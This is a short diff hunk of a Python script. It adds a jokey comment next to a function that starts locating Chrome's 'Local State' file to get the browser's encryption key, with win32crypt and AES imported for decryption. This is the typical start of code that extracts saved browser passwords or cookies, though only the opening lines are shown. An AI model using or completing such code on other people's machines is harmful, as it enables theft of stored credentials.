@@ -4,7 +4,7 @@ import win32crypt
 from Crypto.Cipher import AES
 import json
 import base64
-
+# test with marsellino stay safe :D
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome",
